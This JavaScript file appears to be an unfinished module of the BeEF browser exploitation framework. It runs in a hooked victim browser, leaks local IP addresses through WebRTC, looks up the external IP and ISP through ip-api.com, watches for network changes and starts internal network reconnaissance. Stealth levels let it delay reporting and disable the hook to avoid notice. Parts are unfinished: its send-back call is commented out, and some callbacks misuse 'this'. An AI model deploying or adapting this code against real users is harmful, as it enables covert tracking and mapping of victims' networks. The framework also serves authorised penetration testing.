//
// Copyright (c) 2006-2016 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.aredormant = {
    verbLogEnabled: true,
    saveLocal: false,
    onlineStatus: false,
    rtcIps: "",
    externalIp: "",
    isp: "",
    pollTimeout: 20000,
    netcount: 0,
    ts: null,
    // stealthLevel
    // 1 - not too stealthy, when we see a new network we will:
    //   - * immediately probe for external stuff
    //   - * immediately send data back to beef (or try)
    // 2 - sort of stealthy, when we see a new network we will:
    //   - * immediately probe for external stuff
    //   - * NOT send back to beef until we return to original network
    //   - * And the BeEF hook is disabled until we return
    // 3 - very stealthy, when we see a new network we will:
    //   - * NOT probe for external information
    //   - * NOT send back to beef until we return to original network
    //   - * And the BeeF hook is disabled until we return
    stealthLevel: 1,

    // globals
    agTimer: null,
    agOnlineIntervalTimer: null,

    
    verbLog: function(msg) {
      if (this.verbLogEnabled === true) {
        var p = document.createElement("p");
        p.innerHTML = msg;
        document.body.insertBefore(p, document.body.firstChild);
        console.log(msg);
      }
    },

    printStatus: function(sendtobeef) {
      var sendtobeef = typeof sendtobeef !== 'undefined' ? sendtobeef : false;

      this.verbLog("Online Status: '" + this.onlineStatus + "'");
      this.verbLog("RTC IPs: '" + this.rtcIps+ "'");
      this.verbLog("External IP: '" + this.externalIp + "'");
      this.verbLog("ISP: '" + this.isp + "'");

      if (sendtobeef == true) {
        this.verbLog("FIX THIS")
        //beef.net.send('<%= @command_url %>', <%= @command_id %>,
        //              "OnlineStatus="+onlineStatus+"&RtcIps="+rtcIps+
        //              "&ExternalIp="+externalIp+"&isp="+isp);
      }
    },

    getOnlineState: function() {
      // https://developer.mozilla.org/en-US/docs/Web/API/NavigatorOnLine/onLine
      return window.navigator.onLine;
    },

    // This is yanked from the WebRTC IP Module
    getRtcIp: function(success, failure) {
      var RTCPeerConnection = false;
      if (window.webkitRTCPeerConnection) {
        RTCPeerConnection = window.webkitRTCPeerConnection;
      } else if (window.mozRTCPeerConnection) {
        RTCPeerConnection = window.mozRTCPeerConnection;
      }
  
      if (RTCPeerConnection){
  
          var addrs = Object.create(null);
          addrs["0.0.0.0"] = false;
  
          // Construct RTC peer connection
          var servers = {iceServers:[]};
          var mediaConstraints = {optional:[{googIPv6: true}]};
          var rtc = new RTCPeerConnection(servers, mediaConstraints);
          rtc.createDataChannel('', {reliable:false});
  
          // Upon an ICE candidate being found
          // Grep the SDP data for IP address data
          rtc.onicecandidate = function (evt) {
            if (evt.candidate){
              grepSDP("a="+evt.candidate.candidate);
            }
          };
  
          // Create an SDP offer
          rtc.createOffer(function (offerDesc) {
              grepSDP(offerDesc.sdp);
              rtc.setLocalDescription(offerDesc);
          }, function (e) {
            // failed SDP offer - do nothing
            failure("failed SDP offer");
          });
  
          // Return results
          function processIPs(newAddr) {
              // check here for only ipv4 // HACK
              if (newAddr.length > 15) {
                  return;
              }
              if (newAddr in addrs) return;
              else addrs[newAddr] = true;
              var displayAddrs = Object.keys(addrs).filter(function (k) {
                  return addrs[k];
              });
              success(displayAddrs.join(","));
          }
  
  
          // Retrieve IP addresses from SDP 
          function grepSDP(sdp) {
              var hosts = [];
              // c.f. http://tools.ietf.org/html/rfc4566#page-39
              sdp.split('\r\n').forEach(function (line) {
                  // http://tools.ietf.org/html/rfc4566#section-5.13
                  if (~line.indexOf("a=candidate")) {
                      // http://tools.ietf.org/html/rfc5245#section-15.1
                      var parts = line.split(' '),
                          addr = parts[4],
                          type = parts[7];
                      if (type === 'host') processIPs(addr);
                             // http://tools.ietf.org/html/rfc4566#section-5.7
                  } else if (~line.indexOf("c=")) {
                      var parts = line.split(' '),
                          addr = parts[2];
                      processIPs(addr);
                  }
              });
          }
      }else {
        failure("Doesnt support RTC");
      }
  
    }, // end of getRtcIp

    // This function reaches out to <site> to get info
    // TODO: This should have 'failure' async method handling too
    getExternalDetails: function(completion) {
      var xhttp3 = new XMLHttpRequest();
      xhttp3.onreadystatechange = function() {
          if (xhttp3.readyState == 4 && xhttp3.status == 200) {
              completion(xhttp3.responseText);
          }
      };
      xhttp3.open("GET", "http://ip-api.com/json?rnd="+Date.now(), true);
      xhttp3.send(); 
    },

    // Check if we can use localStorage
    storageAvailable: function(type) {
      try {
        var storage = window[type], x = '__storage_test__';
          storage.setItem(x, x);
          storage.removeItem(x);
          return true;
        }
        catch(e) {
          return false;
        }
    },

    // Save state .. into localStorage if available
    // TODO: This should maybe save a json/data struct into some B64 encoded blob?
    saveState: function(saveLocal, id, online, rtc, ip, isp) {
      if (saveLocal == true) {
        localStorage.setItem('rtc_'+id, rtc);
        this.onlineStatus = online;
        localStorage.setItem('ip_'+id, ip);
        localStorage.setItem('isp_'+id, isp);
        localStorage.setItem('ts_'+id, Date.now());
      } // else ? what then?
    },

    // This tries to figure out where we are
    // In all instances, at the end, it should re-kick off the timers
    presenceCheck: function() {
      // how long have I been away for?
      var prevStamp = this.ts;
      this.verbLog("prev: " + Math.round(prevStamp/1000));
      this.verbLog("Now: " + Math.round(Date.now()/1000));
  
      if ((Math.round(prevStamp/1000)+60) < (Math.round(Date.now()/1000))) {
        // it's been longer than a minute!
        this.verbLog("It's been longer than a minute - what's happened?");
      
        this.startTimers();
      } else {
        // it's been less than a minute
        this.verbLog("It's been less than a minute - what's happened?");
        // do we want to double-check RTC? For instance, if we've gone from
        // GSM to WiFi?
  
        // check changes to online status
        var freshOnlineStatus = this.getOnlineState();
        if ((freshOnlineStatus.toString().toUpperCase()) === 
                this.onlineStatus.toString().toUpperCase()) {
          // we havent' changed status - apparently?
          this.verbLog("we haven't changed online status");
  
          this.startTimers();
        } else {
          // we are now in a different online state.
          this.verbLog("we are now in a different state. freshOnlineStatus:");
          this.verbLog("'" + freshOnlineStatus.toString() + "'");
  
          if ((freshOnlineStatus.toString().toUpperCase()) === "FALSE") {
            // we are now offline from being online
            this.verbLog("we are now offline ... ");
            this.onlineStatus = freshOnlineStatus;
  
            this.startTimers();
          } else {
            // we are now online from offline
            this.verbLog("we are back online!..");
            this.verbLog("do checks here..");
  
            this.getRtcIp(function(e) {
              if (this.checkPreviousRtc(e)) {
                // rtc hasn't changed
                this.verbLog("rtc hasn't changed");
                this.onlineStatus = freshOnlineStatus;
    
                this.startTimers();
              } else {
                // check how different the IP is
                this.verbLog("We were: " + localStorage.getItem('rtc_'+this.netcount));
                this.verbLog("We are now: " + e);
                this.onlineStatus = freshOnlineStatus;
                // save a new network location object
                // kick off scan
                // store results
                this.netRecon(e);
                
              }
  
            }, function(e) {
              //rut roh - couldn't get RtcIp?
              this.verbLog("How?");
            });
          }
        }
      }
    }, // end of presenceCheck()

    checkPreviousRtc: function(ip) {
      var result = false;
      if (this.saveLocal === true) {
        for (var c = 0; c <= this.netcount; c++) {
          if (ip.toUpperCase() === localStorage.getItem('rtc_'+c).toUpperCase()) {
            result = true;
          }
        }
      }
  
      return result;
    },

    checkOnlineState: function() {
      var newState = this.getOnlineState();
      if (this.onlineStatus !== newState) {
        clearInterval(this.agOnlineIntervalTimer); // clear the interval 
        clearTimeout(this.agTimer); // clear the timeout

        this.verbLog("online status changed!");

        this.presenceCheck();
      }
    },

    startTimers: function() {
      this.ts = Date.now();
      this.agTimer = setTimeout(function() {this.presenceCheck()}, this.pollTimeout);
      clearInterval(this.agOnlineIntervalTimer);
      this.agOnlineIntervalTimer = setInterval(function() {this.checkOnlineState()},200);
    },

    netRecon: function(rtcresult) {
      this.verbLog("PERFORM NETWORK RECON HERE!");
      this.getExternalDetails(function(e) {
        this.externalIp = JSON.parse(e).query;
        this.rtcIps = rtcresult;
        this.isp = JSON.parse(e).isp;

        this.netcount++;

        if (this.stealthLevel === 1) {
          this.printStatus(true);
        } else {
          this.printStatus(false);
        }

        this.saveState(this.saveLocal, this.netcount, this.onlineStatus, rtcresult, this.externalIp, this.isp);

        //var s=rtcIps.split('.');
        //var start = s[0]+'.'+s[1]+'.'+s[2]+'.65';
        //var end = s[0]+'.'+s[1]+'.'+s[2]+'.70';
        //var mod_input = start+'-'+end;

        //ping_sweep(mod_input,4,get_http_servers);
        outer_sequential_mod_output = rtcIps;
        outer_sequential();


        // startTimers();
      });
    }, // end of netRecon()

    setupPhase: function() {
      //redundant as we know?
      if (storageAvailable('localStorage') == true) {
        this.saveLocal = true;
        // clear the current localStorage?
        localStorage.clear();
      }

      this.onlineStatus = this.getOnlineState();

      this.getRtcIp(function(e) {
        this.rtcIps = e;
        this.getExternalDetails(function(e) {
          this.externalIp = JSON.parse(e).query;
          this.isp = JSON.parse(e).isp;

          this.printStatus(true);

          this.saveState(this.saveLocal, this.netcount, this.onlineStatus, this.rtcIps, this.externalIp, this.isp);

          if (this.stealthLevel > 1) {
            // turn off beef polling
            beef.updater.lock = true;
          }
          this.startTimers();

        });
      }, function(e) {
        //console.log("failure " + e);
      });
    } // end of setupPhase()

};
beef.regCmp("beef.aredormant");
